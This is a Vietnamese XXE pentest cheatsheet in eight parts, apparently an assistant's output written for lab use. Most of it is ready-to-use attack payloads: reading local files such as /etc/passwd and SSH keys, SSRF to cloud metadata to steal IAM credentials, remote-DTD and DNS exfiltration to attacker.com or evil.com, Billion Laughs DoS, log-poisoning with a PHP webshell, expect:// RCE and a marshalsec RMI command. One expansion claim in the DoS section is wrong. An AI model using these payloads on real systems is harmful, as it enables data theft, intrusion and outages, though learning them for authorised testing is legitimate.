
# 🛠️ XXE Cheatsheet – Phần 1: Tổng quan & Phát hiện lỗ hổng

## 🎯 Mục tiêu

Hiểu và phát hiện lỗ hổng XXE trong ứng dụng xử lý XML.

---

## 🧠 I. Kiến thức nền tảng

### 🧩 1. Internal Entity

Entity được khai báo nội bộ trong `DOCTYPE`.

```xml
<!DOCTYPE test [
  <!ENTITY example "John Doe">
]>
<user>
  <name>&example;</name>
</user>
```

### 🌐 2. External Entity

Entity được định nghĩa bằng tham chiếu tới tài nguyên ngoài (file hoặc URL).

```xml
<!DOCTYPE data [
  <!ENTITY ext SYSTEM "file:///etc/passwd">
]>
<data>&ext;</data>
```

---

## 🔍 II. Dấu hiệu nhận biết lỗ hổng XXE

### ✅ 1. Giao diện / API nhận XML:

- Endpoint `POST /api/xml`
    
- Content-Type: `application/xml`
    

### ✅ 2. XML Parser không chặn DOCTYPE:

- Gửi payload có `<!DOCTYPE ... [ ... ]>` không bị lỗi.
    

### ✅ 3. Kết quả phản hồi có chứa giá trị từ entity:

```xml
<!DOCTYPE test [<!ENTITY test "injected">]>
<root>&test;</root>
```

⟶ Nếu server phản hồi `"injected"` → có thể vulnerable.

---

## 🧪 III. Payload phát hiện cơ bản

### Basic Internal Entity Test

```xml
<?xml version="1.0"?>
<!DOCTYPE userInfo [
  <!ENTITY example "Doe">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

⟶ Nếu `lastName` trả về `Doe` → lỗ hổng XXE tồn tại.

---

## 🧪 IV. Điều chỉnh HTTP Request để khai thác

|Header|Value|
|---|---|
|Content-Type|`application/xml`|
|User-Agent|`BurpSuite` (tùy chọn)|

### 📬 CURL Demo

```bash
curl -X POST http://target/api/xml \
  -H "Content-Type: application/xml" \
  -d @payload.xml
```

---

## 🛡️ V. Điều kiện để khai thác

|Điều kiện|Có thể khai thác?|
|---|---|
|Cho phép khai báo `<!DOCTYPE>`|✅|
|Cho phép entity SYSTEM / PUBLIC|✅|
|Phản hồi XML có render entity|✅|
|Không chặn truy cập file:// hoặc http://|✅|

---

## 🧪 VI. Payload xác định khả năng đọc file (file disclosure)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>
```

Kết quả phản hồi có chứa `/etc/passwd` → XXE confirmed.

---

## 🧰 VII. Công cụ hỗ trợ kiểm tra

|Tool|Mô tả|
|---|---|
|Burp Suite (Pro) + Collaborator|Phát hiện XXE OOB|
|`xxe-injector`|CLI tool tự động|
|`dtddos`|Tạo Billion Laughs payload|
|`GoSecure dtd-finder`|Tìm và khai thác DTD hệ thống|

---

## 📝 Ghi chú thêm

- Luôn đảm bảo request XML hợp lệ (1 root element).
    
- Một số server yêu cầu encoding chính xác (`UTF-8`, `ISO-8859-1`).
    
- Có thể cần thử cả nội dung dạng `CDATA`.
    

---

Dưới đây là **Phần 2 – Exploiting XXE to Read Local Files** trong chuỗi **XXE Cheatsheet** dành cho lab pentest.

---

# 📂 XXE Cheatsheet – Phần 2: Khai thác XXE để Đọc File Local

## 🎯 Mục tiêu

Sử dụng XXE để đọc các tệp nhạy cảm trên hệ thống máy chủ (Local File Disclosure).

---

## ⚙️ I. Cơ chế hoạt động

Khi ứng dụng không chặn external entity (`SYSTEM`), attacker có thể khai báo 1 thực thể trỏ đến một file hệ thống như `/etc/passwd`, và đưa entity đó vào nội dung XML. Nếu parser không kiểm soát tốt, nội dung file sẽ được **render trong phản hồi**.

---

## 🔐 II. Payload cơ bản – Linux

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 🎯 Target files thường gặp

|Mục tiêu|Đường dẫn|
|---|---|
|User list (Linux)|`/etc/passwd`|
|SSH private key|`/home/<user>/.ssh/id_rsa`|
|History|`/home/<user>/.bash_history`|
|Cronjobs|`/etc/crontab`|
|Apache Config|`/etc/httpd/conf/httpd.conf` hoặc `/etc/apache2/apache2.conf`|

---

## 🪟 III. Payload cho Windows

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>
```

### 🎯 Target file Windows

|Mục tiêu|Đường dẫn|
|---|---|
|Cấu hình hệ thống cơ bản|`C:\Windows\win.ini`|
|Mật khẩu ứng dụng (.xml)|`C:\ProgramData\MyApp\config.xml`|
|File cấu hình Apache|`C:\xampp\apache\conf\httpd.conf`|
|User Desktop / Documents|`C:\Users\<username>\Desktop\secret.txt`|

---

## 🧪 IV. Payload nâng cao: base64 encode để tránh filter

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY xxe SYSTEM 'data:text/plain;base64,%file;'>">
  %eval;
]>
<root>&xxe;</root>
```

⟶ Nội dung file `/etc/passwd` sẽ được encode base64.

> 💡 Giúp **tránh WAF**, hoặc **gửi ra ngoài** qua OOB dễ hơn.

---

## 📤 V. Payload kết hợp Out-of-Band (OOB)

Nếu server không phản hồi file nội tuyến nhưng vẫn cho phép truy cập ra ngoài (`http`), ta có thể gửi nội dung file tới server của attacker.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/external.dtd">
  %dtd;
]>
<data>&exfil;</data>
```

**external.dtd trên server attacker:**

```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?p=%file;'>">
%all;
```

---

## 🧰 VI. Kiểm tra qua BurpSuite Repeater

1. Gửi request với payload `file:///etc/passwd`
    
2. Kiểm tra response:
    
    - Nếu có `root:x:0:0:` hoặc `bin/bash` → Confirmed file read.
        
3. Dùng Collaborator Client để thử payload OOB → Check DNS/HTTP callback.
    

---

## 🧼 VII. Giới hạn và bypass

|Cơ chế chặn|Bypass được không?|Ghi chú|
|---|---|---|
|Chặn DOCTYPE|❌|Không khai báo entity được|
|Cho phép DOCTYPE nhưng chặn SYSTEM|⚠️|Có thể dùng **parameter entity + DTD remote**|
|Parser dùng thư viện safe (e.g. `defusedxml`)|❌|Không khai thác được|

---

## ✅ VIII. Checklist đọc file

-  Test `file:///etc/passwd` hoặc `win.ini`
    
-  Nếu bị filter: thử encode base64 hoặc dùng `CDATA`
    
-  Nếu server không phản hồi: thử gửi qua OOB (http/dns)
    
-  Ghi chú: không phải parser nào cũng cho phép path dạng `file://C:/...`
    

---

Dưới đây là **Phần 3 – Exploiting XXE to Perform SSRF (Server Side Request Forgery)** trong chuỗi **XXE Cheatsheet** dành cho lab pentest.

---

# 🌐 XXE Cheatsheet – Phần 3: Khai thác XXE để SSRF (Server-Side Request Forgery)

## 🎯 Mục tiêu

Lợi dụng XXE để ép máy chủ thực hiện các HTTP request nội bộ – từ đó truy cập tài nguyên nội bộ (như metadata AWS, API nội bộ, service backend...).

---

## ⚙️ I. Cơ chế hoạt động

- Trình phân tích XML (XML parser) được cấp quyền đọc `SYSTEM` entity.
    
- Thay vì `file://`, attacker dùng `http://` (hoặc `ftp://`, `gopher://`, v.v.)
    
- Trình parser gửi HTTP request tới địa chỉ nội bộ / cloud endpoint.
    

⟶ Gây ra SSRF.

---

## 🔥 II. Payload SSRF cơ bản (dùng HTTP)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<data>&xxe;</data>
```

Nếu server thực hiện HTTP request nội bộ tới `/admin` → và phản hồi (hoặc bị chậm lại) → có thể khai thác SSRF.

---

## ☁️ III. Mục tiêu phổ biến của SSRF

|Mục tiêu|Giao thức|URL ví dụ|
|---|---|---|
|AWS EC2 Instance Metadata|HTTP|`http://169.254.169.254/latest/meta-data/`|
|GCP Metadata|HTTP|`http://metadata.google.internal/computeMetadata/v1/`|
|Docker API|HTTP (socket)|`http://localhost:2375/containers/json`|
|Admin Dashboard nội bộ|HTTP|`http://127.0.0.1:8000/admin`|
|Redis/SMTP Internal Services|gopher, ftp|`gopher://127.0.0.1:6379/_PING`|

---

## 🧪 IV. SSRF example – AWS metadata extraction

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

> ⛏️ Có thể thu thập **temporary AWS credentials** từ EC2 instance nếu chạy bằng IAM Role.

---

## 🎭 V. Gửi dữ liệu SSRF ra ngoài (exfil)

Dùng DTD external để đẩy dữ liệu ra khỏi hệ thống.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
  %dtd;
]>
<data>&exfil;</data>
```

**ext.dtd**:

```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?leak=%ext;'>">
%all;
```

---

## 🚦 VI. Kết hợp Burp Collaborator hoặc DNSlog

- Gửi payload có `http://<sub>.burpcollaborator.net`
    
- Nếu có kết nối tới Collaborator → confirm SSRF
    
- Áp dụng cả khi không phản hồi gì trên client side
    

---

## 🧼 VII. Phòng tránh và hạn chế

|Cơ chế chặn|Có hiệu quả?|
|---|---|
|Chặn DOCTYPE|✅|
|Parser bảo mật (defusedxml, etc)|✅|
|Allowlist domain trong URL fetch|✅|
|Phân quyền network (VM không được gọi metadata)|✅|

---

## ✅ VIII. Checklist SSRF từ XXE

-  Thử `http://127.0.0.1` hoặc `localhost`
    
-  Thử `http://169.254.169.254` (cloud metadata)
    
-  Dùng external DTD để gửi thông tin ra ngoài
    
-  Dùng Burp Collaborator để confirm OOB request
    
-  Nếu có lỗi DNS → test kỹ payload encode
    

---

Dưới đây là **Phần 4 – Exploiting XXE to Perform DoS (Billion Laughs Attack)** trong chuỗi **XXE Cheatsheet** dành cho lab pentest.

---

# 💥 XXE Cheatsheet – Phần 4: Khai thác XXE để Tấn công Từ chối Dịch vụ (DoS – Billion Laughs)

## 🎯 Mục tiêu

Sử dụng XXE để gây ra **DoS (Denial of Service)** bằng cách tạo **recursive entity** khiến XML parser tiêu tốn cực nhiều tài nguyên (CPU/RAM), gây treo hoặc crash ứng dụng.

---

## ⚙️ I. Cơ chế hoạt động

- XXE DoS tận dụng việc các **entity lồng nhau đệ quy** để **nhân bản văn bản** theo cấp số nhân (Exponential Expansion).
    
- Gọi là "Billion Laughs" vì biến `"lol"` sẽ được khai báo nhiều lần và mở rộng dần:
    
    - `&lol9;` chứa `&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;` → Gây bùng nổ RAM.
        

---

## 🔥 II. Payload Billion Laughs cơ bản

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;">
]>
<root>&lol9;</root>
```

⟶ **&lol9;** khi expand sẽ tạo ra khoảng **2⁹ = 512** lần `lol`, rồi nhân tiếp thành hàng triệu ký tự ⇒ tấn công DoS bằng cách ăn RAM.

---

## 🔁 III. Recursive Entity Attack – Alternative DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY a "&b;">
  <!ENTITY b "&a;">
]>
<root>&a;</root>
```

⟶ Gây **infinite loop** trong parser (nếu parser không giới hạn depth) ⇒ **CPU 100%** → treo server.

---

## 🧪 IV. Biểu hiện của DoS qua XXE

|Biểu hiện khi gửi payload DoS|Ý nghĩa|
|---|---|
|Server treo / không phản hồi|Parser không có giới hạn entity depth|
|Server báo lỗi `entity reference loop`|Có protection|
|Tăng RAM đột ngột trong container|Dấu hiệu bị khai thác|
|CPU spike lên 100%|Infinite loop / string expansion|

---

## 🧼 V. Cách phòng tránh

|Cơ chế|Có hiệu quả?|
|---|---|
|Giới hạn số entity mở rộng|✅|
|Tắt hoàn toàn entity expansion|✅|
|Dùng parser an toàn (`defusedxml`, `lxml.safe_mode`)|✅|
|Chặn khai báo `<!DOCTYPE>`|✅|
|Sử dụng thư viện mới (SAX / JSON)|✅|

---

## 🛡️ VI. Detection / Tuning trong lab

- **Nếu server trả lỗi** như:
    
    - `XML entity expansion limit exceeded`
        
    - `Entity reference loop detected`  
        ⟶ Cho thấy parser đã được cấu hình chống DoS.
        
- **Nếu không có phản hồi / 500** → kiểm tra logs server, memory spike, hoặc behavior backend.
    

---

## ✅ VII. Checklist kiểm tra DoS XXE

-  Gửi payload `lol9` với 9 tầng expansion
    
-  Gửi entity loop (`a` → `b`, `b` → `a`)
    
-  Quan sát:
    
    - Treo server
        
    - RAM tăng
        
    - Lỗi parser trong phản hồi
        
-  Áp dụng trên cả Windows và Linux
    

---

Dưới đây là **Phần 5 – Khai thác XXE kết hợp với LFI, RCE, và Remote DTD để bypass** trong chuỗi **XXE Cheatsheet** dành cho lab pentest.

---

# 🧬 XXE Cheatsheet – Phần 5: Kết hợp XXE với LFI / RCE / Remote DTD để Bypass Filter

---

## 🎯 Mục tiêu

Khai thác XXE nâng cao bằng cách kết hợp với:

- 🧾 **LFI** (Local File Inclusion): Đọc file hệ thống thông qua entity.
    
- 💣 **RCE** (Remote Code Execution): Thông qua file log, cấu hình, hoặc upload.
    
- 🌍 **Remote DTD (external DTD)**: Giúp bypass filter bằng cách nhúng payload từ ngoài.
    

---

## 📄 I. XXE + LFI

Giống phần 2, nhưng dùng trong **ứng dụng có chức năng đọc file nội bộ** hoặc **bao lỗi hiển thị nội dung file**:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

- Nếu ứng dụng load file từ tên người dùng, có thể đọc file qua biến XML.
    
- Gặp trong Java hoặc PHP: `loadXML($_POST['user']);`
    

---

## 💥 II. XXE + RCE (Log File Injection → Triggered via LFI)

### 🧠 Ý tưởng:

1. Inject PHP code vào log (User-Agent / Referer).
    
2. Dùng XXE để **read file log chứa PHP code** → nếu ứng dụng **include file log**, code được thực thi.
    

### 🧾 Payload: Inject vào header:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

### 🪓 Sau đó dùng XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">
]>
<data>&xxe;</data>
```

⟶ Truy cập file log → thực thi thông qua LFI (`vuln.php?page=access.log&cmd=id`)

---

## 🌍 III. Remote DTD (External Entity) – Bypass local restrictions

Dùng external DTD để bypass WAF hoặc parser giới hạn `SYSTEM` nội bộ:

### 📁 local.xml

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
  %dtd;
]>
<data>&send;</data>
```

### 🌐 ext.dtd (ở máy attacker):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?leak=%file;'>">
%all;
```

⟶ Server gọi tới `attacker.com` với nội dung `/etc/passwd`

---

## 🔒 IV. External Parameter Entity (XEE) Bypass

Nhiều parser **chặn SYSTEM trực tiếp**, nhưng không chặn entity kiểu `%` (parameter entity) + `<!ENTITY % dtd SYSTEM "...">`.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
  %dtd;
]>
<data>&leak;</data>
```

---

## ⚠️ V. Khi nào nên dùng remote DTD?

|Tình huống|Dùng Remote DTD?|
|---|---|
|SYSTEM entity bị filter hoặc bị chặn|✅|
|Không thấy response từ server|✅|
|Muốn exfil dữ liệu ra ngoài|✅|
|Parser hỗ trợ OOB request (Java XML, etc)|✅|

---

## ✅ VI. Checklist kết hợp

-  Inject PHP shell vào log → dùng XXE để LFI log
    
-  Test `file:///etc/passwd` kết hợp RCE qua upload
    
-  Test `<!ENTITY % dtd SYSTEM "http://evil.com/ext.dtd">`
    
-  Nếu thấy lỗi "external DTD not allowed" → thử encode / bypass
    

---

Dưới đây là **Phần 6 – Khai thác XXE qua PHP Wrapper (php://filter, zip://, expect://)** trong chuỗi **XXE Cheatsheet** dành cho lab pentest.

---

# 🧪 XXE Cheatsheet – Phần 6: PHP Wrappers qua XXE

## 🎯 Mục tiêu

Khai thác XXE để **đọc file qua wrapper đặc biệt trong PHP**, hoặc **thực thi command** (RCE), đặc biệt hữu dụng khi các filter ngăn không cho đọc `file:///` trực tiếp.

---

## 🧰 I. Giới thiệu PHP Wrapper

|Wrapper|Chức năng chính|
|---|---|
|`php://filter`|Đọc file và **encode Base64**|
|`zip://`|Truy cập **file trong file .zip**|
|`expect://`|**Thực thi command** (RCE – nếu cho phép)|

---

## 📖 II. `php://filter` – Đọc file + encode Base64

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&file;</data>
```

- Dùng trong ứng dụng **không in file ra trực tiếp**, nhưng in được output base64.
    
- Dễ **Bypass WAF** chặn `file://`.
    

> ⛏️ Decode kết quả trả về bằng base64 để xem nội dung file.

---

## 📦 III. `zip://` – Đọc file nằm trong file nén `.zip`

- Trường hợp ứng dụng xử lý **tự động file upload**
    
- Nếu attacker đã **upload file .zip chứa webshell / sensitive content**, có thể dùng XXE để đọc.
    

```xml
<!ENTITY % zip SYSTEM "zip:///var/www/html/uploads/test.zip#shell.php">
```

> `#shell.php` là file bên trong `test.zip` đã upload.

---

## 💣 IV. `expect://` – RCE qua XXE (nếu PHP hỗ trợ)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % rce SYSTEM "expect://id">
]>
<data>&rce;</data>
```

> ⛔ **Yêu cầu**:
> 
> - PHP **chạy với expect wrapper enabled**
>     
> - Không bị chặn `allow_url_include = Off`
>     

> 📌 Rất hiếm gặp, nhưng cần test nếu suspect là shared hosting hoặc lab.

---

## 🔁 V. Kết hợp XXE + Wrapper nâng cao (via Remote DTD)

### 1. local.xml

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
  %dtd;
]>
<data>&out;</data>
```

### 2. ext.dtd (trên attacker)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY out SYSTEM 'http://attacker.com/?exfil=%file;'>">
%all;
```

⟶ Server đọc `/etc/passwd`, encode base64, và gửi về cho attacker qua HTTP request.

---

## 🧪 VI. Detection / Điều kiện hoạt động

|Tình huống kiểm tra|Kết quả nếu thành công|
|---|---|
|Gửi entity dùng `php://filter`|Nhận được base64-encoded file|
|Gửi `expect://id`|Output trả về là kết quả command|
|Dùng `zip://` để truy cập file|Trả về nội dung file trong zip|

---

## ✅ VII. Checklist kiểm tra PHP wrapper trong XXE

-  Thử `php://filter/convert.base64-encode/resource=/etc/passwd`
    
-  Nếu ứng dụng hỗ trợ upload → thử `zip://`
    
-  Gửi thử `expect://id` nếu nghi có RCE
    
-  Dùng Remote DTD để gửi dữ liệu ra ngoài
    


---

# 🔄 XXE Cheatsheet – Phần 7: SOAP, XML-RPC & Bypass Content-Type

## 🎯 Mục tiêu

Khai thác XXE ẩn trong các giao thức hoặc vùng xử lý XML không điển hình:

- 🧼 SOAP / XML-RPC request
    
- 🩹 Bypass kiểm tra `Content-Type`
    
- ⚗️ Lách qua JSON / URL encoded có XML bên trong
    

---

## 🧼 I. XXE trong SOAP Request

SOAP là giao thức XML-based thường gặp trong các dịch vụ web backend.

### 🧪 Ví dụ SOAP + XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <getUser>
      <username>&xxe;</username>
    </getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

> Nếu backend dùng parser không an toàn (DOM/SAX), &xxe sẽ được thay thế bằng nội dung file.

---

## ☎️ II. XXE trong XML-RPC

XML-RPC là một kiểu API cũ dùng XML để truyền request ⇒ rất dễ bị XXE nếu không lọc.

### 🧪 Ví dụ:

```xml
<?xml version="1.0"?>
<!DOCTYPE methodCall [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>getUser</methodName>
  <params>
    <param>
      <value><string>&xxe;</string></value>
    </param>
  </params>
</methodCall>
```

> Một số ứng dụng cũ (WordPress XML-RPC, Java APIs...) dễ bị dính kiểu này.

---

## 🩹 III. Bypass Content-Type để chèn XML

### Tình huống:

- API chỉ chấp nhận `application/json` hoặc `application/x-www-form-urlencoded`
    
- Nhưng bên trong vẫn **parse XML** nếu input chèn XML hợp lệ
    

### 🧪 JSON Bypass:

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "xml": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user>&xxe;</user>"
}
```

### 🧪 URL Encoded Bypass:

```http
POST /api HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>
```

> Đôi khi chỉ cần một `data=` là đủ để app đưa nội dung vào parser XML backend.

---

## 🧪 IV. SOAP hoặc XML-RPC + Remote DTD

Bạn có thể kết hợp với **remote DTD** để bypass filter hoặc gửi dữ liệu ra ngoài:

```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/ext.dtd">
  %dtd;
]>
```

⟶ Sử dụng như các payload trong phần 5 để exfiltrate dữ liệu hoặc trigger OOB.

---

## 🔍 V. Kỹ thuật kiểm tra và phát hiện

|Kỹ thuật|Biểu hiện|
|---|---|
|Inject entity &xxe trong `<user>`|Nội dung file được in ra|
|SOAP request bị lỗi parser|Lỗi parser trong header|
|JSON chứa XML → parser lỗi hoặc leak|Phản hồi có nội dung file|
|application/x-www-form-urlencoded + XML|Có khả năng được xử lý ở backend|

---

## ✅ VI. Checklist kiểm tra SOAP/XML-RPC XXE

-  Gửi SOAP request chứa `<!ENTITY xxe ...>`
    
-  Test XML-RPC payload chứa entity
    
-  Gửi `Content-Type: application/json` với XML nội embedded
    
-  Gửi payload bằng `data=` dạng XML → kiểm tra phản hồi
    
-  Nếu không thấy gì → thử `Remote DTD`
    

---



---

# ☣️ XXE Cheatsheet – Phần 8: Java RMI / SSRF / DNS / OOB Exfil

---

## 🎯 Mục tiêu

Tận dụng XXE để gây **OOB (Out-of-Band) request**, hoặc **thực thi từ xa**, đặc biệt trong các ứng dụng:

- chạy trên **Java**
    
- có **kết nối ra ngoài**
    
- dùng thư viện dễ dính XXE như **Xerces**, **JAXB**, **JDOM**
    

---

## 📡 I. Java RMI Exploit (XXE → Remote Code Execution)

### ☠️ Điều kiện:

- Ứng dụng sử dụng XML parser Java không an toàn
    
- Có hỗ trợ `java.net.URL` hoặc `javax.naming.InitialContext`
    
- Attacker có **RMI server chứa serialized payload**
    

### 📑 Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % rce SYSTEM "http://attacker:8000/Exploit.class">
]>
<data>&rce;</data>
```

### 🧪 Kết quả:

- Parser Java sẽ tự động gọi `http://attacker:8000/Exploit.class`
    
- Nếu dùng RMI → có thể thực thi mã từ xa
    

> Sử dụng [marshalsec](https://github.com/mbechler/marshalsec) để tạo RMI payload.

```bash
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8080/#Exploit" 1099
```

---

## 🌐 II. SSRF qua XXE (Gọi tới nội bộ backend)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<data>&xxe;</data>
```

- Gọi đến **localhost**, có thể scan internal port (HTTP, Redis, etc)
    
- Nếu `/admin` trả về thông tin nhạy cảm ⇒ attacker thu được trong response
    

> Sử dụng kỹ thuật này để dò SSRF + Port scan.

---

## 🧬 III. DNS Exfiltration via XXE

Khi ứng dụng **không trả về dữ liệu**, có thể sử dụng **DNS để exfil**

### 💣 Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
  %dtd;
]>
<data>&exfil;</data>
```

### 📁 Nội dung ext.dtd (trên máy attacker):

```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://%file;.attacker.com/'>">
%all;
```

⟶ Server thực hiện DNS lookup đến `%file;.attacker.com`  
⟶ Trên attacker: chạy DNS server để log request

> Sử dụng [dnschef](https://github.com/iphelix/dnschef) hoặc [interactsh](https://github.com/projectdiscovery/interactsh) để bắt gói DNS.

---

## 💉 IV. Detect OOB từ XXE

|Kỹ thuật|Mục tiêu|Điều kiện|
|---|---|---|
|`file:///etc/passwd`|LFI nội bộ|Không bị chặn file scheme|
|`http://attacker`|Gọi ra ngoài HTTP|Mạng cho phép outbound|
|`ftp://attacker`|SSRF FTP|FTP được mở|
|`dns://anything.attacker.com`|DNS Exfil|Có DNS lookup|

---

## ✅ V. Checklist khi test OOB XXE

-  Dùng Remote DTD để chèn `SYSTEM http://attacker`
    
-  Gửi payload chứa `ftp://attacker` / `http://` / `dns://`
    
-  Quan sát log tại attacker (Burp Collaborator, Interactsh, DNSChef)
    
-  Kiểm tra mạng cho phép request outbound (curl trong lab)
    
-  Test exfil từ `file:///etc/hostname` hoặc `/proc/self/environ`
    

---

Bạn muốn viết tiếp **Phần 9 – Stacked XXE, đa lớp ENTITY lồng nhau để bypass filter** không?